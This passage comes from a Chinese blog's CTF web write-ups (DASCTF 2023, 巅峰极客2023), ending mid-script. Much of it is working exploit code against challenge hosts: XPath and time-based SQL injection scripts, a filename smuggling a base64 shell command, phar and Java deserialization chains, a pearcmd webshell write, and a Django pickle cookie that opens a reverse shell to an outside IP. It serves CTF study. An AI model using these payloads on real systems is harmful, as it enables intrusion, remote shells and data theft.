class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&#x27;http://1faab4d0-7d84-46a1-b6fb-5dc991bc7f72.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        <span class="comment"># payload_1 = &#123;&quot;username&quot;:&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j),&quot;password&quot;:123&#125;</span></span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        <span class="comment"># payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        <span class="comment"># payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        <span class="comment"># payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)</span></span><br><span class="line">        payload_username =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload_username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># payload_password =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload_username)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line"><span class="comment">#003d7628772d6b57fec5f30ccbc82be1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登录成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登录失败&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>然后就可以把密码给爆破出来了</p><h3 id="system命令拼接"><a href="#system命令拼接" class="headerlink" title="system命令拼接"></a>system命令拼接</h3><p><img src="../images/image-20230726145115503.png" alt="image-20230726145115503"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 210</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=4ca196683169f8034a864930f1f86e84</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;;echo bHMgLwo|base64 -d|bash;ajpg.jpg&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传成功后</p><p><img src="../images/image-20230726145658481.png" alt="image-20230726145658481"></p><p>通过<code>get</code>传参       <strong><code>?file=上传的文件名字</code></strong></p><p><img src="../images/image-20230726145829047.png" alt="image-20230726145829047"></p><p>成功拿到flag名字  之后修改这个文件名就能拿到flag了</p><h3 id="phar文件上传"><a href="#phar文件上传" class="headerlink" title="phar文件上传"></a>phar文件上传</h3><p>先生成一个phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="string">&quot;/;cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>然后上传图片  (<strong>修改后缀上传</strong>)</p><p><img src="../images/image-20230726153903059.png" alt="image-20230726153903059"></p><p>这里的话是<code>md5_file</code>来触发的</p><p><img src="../images/image-20230726153925874.png" alt="image-20230726153925874"></p><p>如果不填<code>todo=md5</code>的话  是不能触发的</p><p>(<strong>我也不知道为啥。。。。。。。。</strong>)</p><p><img src="../images/image-20230726162917937.png" alt="image-20230726162917937"></p><p><strong>按道理来说的话  在构造函数这里的时候已经触发这个<code>phar</code>了</strong></p><p><strong>解决了这个问题了</strong></p><p> 原因就是因为传进来的值会有<code>/</code>     然后就会进入正则  抛出异常</p><p><img src="../images/image-20230729003235802.png" alt="image-20230729003235802"></p><p>还是自己蠢了   tmd</p><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><p>这题真狗  </p><p>但是尝试<strong>pearcmd</strong>没写入成功(当时<code>pearcmd.php</code>位置错了 没发现)</p><p>然后尝试sql写入半天  还是没成功</p><p>最后又返回来用<code>pearcmd</code>写入才成功  (发现了位置不对后才成功)</p><p><a href="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">Y4—熊海CMS代码审计</a></p><p>看这篇文章就行了</p><p><img src="../images/image-20230726164436791.png" alt="image-20230726164436791"></p><p>就是这里</p><p><strong>如果访问默认的<code>pearcmd.php</code>路径的话   这个题目是访问不到的</strong></p><p><img src="../images/image-20230726171220938.png" alt="image-20230726171220938"></p><p>问下<code>gpt</code>之后  发现了<code>/usr/share/php</code>这个位置  尝试之后发现成功了</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/index.php?+config-create+/&amp;r=../../../../../../../../../usr/share/php/pearcmd&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>+/tmp/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726172057819.png" alt="image-20230726172057819"></p><p>然后进行文件包含</p><p><img src="../images/image-20230726172316775.png" alt="image-20230726172316775"></p><p><strong>成功写入</strong></p><p>然后直接RCE就行了</p><h2 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h2><p>这道题是参考这个 <a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%A2%AB%E6%B3%84%E6%BC%8F%E7%9A%84%E5%A7%9C%E6%88%88/README.md">hackergame2019</a>  出的题</p><p>这题考察得是<code>django</code>的<code>RCE</code></p><p><strong>拿到源码之后</strong></p><p>主要看里面的<code>settings.py</code>  这个文件</p><p><img src="../images/image-20230729154657238.png" alt="image-20230729154657238"></p><p><img src="../images/image-20230729154708124.png" alt="image-20230729154708124"></p><p>这里的话提供了<code>SECRET_KEY</code>   并且对<code>session</code>是进行<code>Pickle</code>反序列化解析的</p><p>通过这里的话我们就很清晰能得知可以通过伪造<code>session</code>来进行反序列化的</p><p><strong>并且在其官方文档里也提到了这个问题</strong></p><p><img src="../images/image-20230729154935067.png" alt="image-20230729154935067"></p><p><a href="https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions">https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions</a></p><p>然后我们就去搜索这几个关键字  得到一篇文章  并且是有poc的</p><p><img src="../images/image-20230729155304243.png" alt="image-20230729155304243"></p><p>题目给我们的附件中  可以看到<code>django</code>的版本</p><p><img src="../images/image-20230729155402295.png" alt="image-20230729155402295"></p><p><img src="../images/image-20230729155428512.png" alt="image-20230729155428512"></p><p>其实默认采用的是<code>json</code>的序列化   但是为了出题  作者将其改为了<code>pickle</code>序列化</p><p><img src="../images/image-20230729155759379.png" alt="image-20230729155759379"></p><p>本来实际上是这样的  但是并不影响我们自己修改成Pickle</p><p><strong>poc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn&#x27;</span></span><br><span class="line">salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> django.core.signing</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleSerializer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Simple wrapper around pickle to be used in signing.dumps and</span></span><br><span class="line"><span class="string">    signing.loads.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dumps</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.loads(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/3389 &lt;&amp;1&quot;&#x27;</span>,),-<span class="number">1</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">False</span>, <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">out_cookie= django.core.signing.dumps(</span><br><span class="line">    Command(), key=SECRET_KEY, salt=salt, serializer=PickleSerializer)</span><br><span class="line"><span class="built_in">print</span>(out_cookie)</span><br></pre></td></tr></table></figure><p>这里的话是先进行登录  然后将<code>cookie</code>修改为我们构造的  然后访问<code>auth</code>路由就行了</p><p>但是我这里没弹成功  不知道是<code>payload</code>的问题还是我的操作问题</p><h2 id="ez-timing"><a href="#ez-timing" class="headerlink" title="ez_timing"></a>ez_timing</h2><p>这道题考察的是http2</p><p><strong>确实符合题目说的一种很新的方式</strong></p><p>这里的话是参考github上这个出的题目  几乎一模一样</p><p><a href="https://github.com/ConnorNelson/spaceless-spacing">http2</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3MjcwOTAwNw==&amp;mid=2247484933&amp;idx=1&amp;sn=60ae6e59096e22a2b60bb7ba4e80ce04&amp;chksm=ceea68e5f99de1f3b072baf3c069c4f1530f5c17b34811e51133d42fbfe9de4638d5b5f14071&amp;mpshare=1&amp;scene=23&amp;srcid=072376b235QJm9tNCYWMZFQU&amp;sharer_sharetime=1690091289890&amp;sharer_shareid=9c0f9b7dd366a1431577547d077f70be#rd">这个wp中也写了这个题目的wp</a></p><p>好像这个题目的地址关了  所以我就没做了</p>]]></content>
      
      
      
        <tags>
            
            <tag> DASCTF 2023 &amp; 0X401-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客2023-Web</title>
      <link href="/posts/7d1902a5.html"/>
      <url>/posts/7d1902a5.html</url>
      
        <content type="html"><![CDATA[<h2 id="BabyURL"><a href="#BabyURL" class="headerlink" title="BabyURL"></a>BabyURL</h2><p><strong>审计代码得出一个思路</strong></p><p>就是在反序列化的时候会将得到的内容写入到  <code>/tmp/file</code>下</p><p>然后在<code>/file</code>下就可以读取到内容</p><p><img src="../images/image-20230721165726299.png" alt="image-20230721165726299"></p><p>题目把这个有反序列化入口的类给ban了  </p><p>这里的话就可以容易想到二次反序列化绕过</p><p>刚好就可以想到<code>SignedObject</code>这个jdk自带的类  </p><p>查看依赖发现没有什么特别的类可以用   于是就想到之前阿里云ctf里用过的<code>JackSon</code>这个类</p><p>刚好可以触发getter  </p><p>于是得出利用了链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException</span><br><span class="line">POJONode</span><br><span class="line">SignedObject</span><br></pre></td></tr></table></figure><p>所以最终的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yancao.ctf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLHelper;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLVisiter;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.util.MyObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLHelper</span>(<span class="string">&quot;File:///F14gIsHereY0UGOTIT&quot;</span>);</span><br><span class="line">        <span class="type">URLVisiter</span> <span class="variable">urlVisiter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLVisiter</span>();</span><br><span class="line">        handler.visiter = urlVisiter;</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(handler,privateKey,signingEngine);</span><br><span class="line">        <span class="comment">//这个SignedObject传进来就是要反序列化的类</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="comment">//这里就是使用POJONode这个可以触发任意getter的方法 ----&gt;  来触发这个signedObject里的getObject()方法</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">o</span> <span class="operator">=</span> (URLHelper)ois.readObject();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>通过这道题的话学到了一些新东西</strong></p><p><img src="../images/image-20230724101125766.png" alt="image-20230724101125766"></p><p>这道题的话其实也可以利用<code>netdoc</code>这个协议来读取文件内容   </p><p>(可以当作<code>file</code>协议的替代品)</p><h2 id="hellosql"><a href="#hellosql" class="headerlink" title="hellosql"></a>hellosql</h2><p>这里的话先是fuzz了一下  发现<strong>sleep benchmark rpad if count</strong> 都过滤了</p><p>然后在页面尝试测试了一下   猜测是个<strong>sql盲注</strong></p><p>(所以就猜测是用<strong>笛卡尔乘积</strong>)    </p><p>这里的话却不能使用这个常规的  (因为<code>count</code>和<code>if</code>都被ban了)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns)a,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns)b,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns limit <span class="number">1</span>,<span class="number">7</span>)c) limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>当时因为懒 没深究这个  看别的题去了  导致没做出来。。。。。。。</p><p><strong>直接问gpt</strong></p><p><img src="../images/image-20230724104909369.png" alt="image-20230724104909369"></p><p><img src="../images/image-20230724105015874.png" alt="image-20230724105015874"></p><p><strong>直接让gpt来帮我们在原来的基础上进行修改</strong></p><p><img src="../images/image-20230724105451643.png" alt="image-20230724105451643"> </p><p><img src="../images/image-20230724105521195.png" alt="image-20230724105521195"></p><p>可以成功进行延时</p><p><strong>最终的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            burp0_url = <span class="string">&quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot;</span> \</span><br><span class="line">                        <span class="string">&quot;substr(group_concat(table_name),&#123;&#125;,1)) from information_schema.tables where table_schema=database()))=&#123;&#125; then (select sum(1) FROM &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.views D) else 1 end-- 